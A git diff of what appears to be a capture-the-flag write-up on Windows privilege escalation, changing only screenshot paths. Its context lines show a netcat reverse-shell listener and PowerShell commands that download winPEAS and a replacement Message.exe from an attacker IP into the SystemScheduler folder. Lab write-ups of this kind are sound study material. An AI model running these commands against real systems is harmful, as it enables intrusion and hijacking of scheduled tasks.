@@ -54,7 +54,7 @@ rlwrap nc -lvnp 4445
 
 Upload the file
 
-<figure><img src="../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -128,9 +128,9 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233
 winPEASx64.exe
 ```
 
-``![](<../../.gitbook/assets/image (25).png>)``
+``![](<../../.gitbook/assets/image (25) (1).png>)``
 
-<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 cd C:\Program Files (x86)\SystemScheduler\Events
@@ -157,7 +157,7 @@ cd C:\Program Files (x86)\SystemScheduler
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233:81/Message.exe','Message.exe')"
 ```
 
-<figure><img src="../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
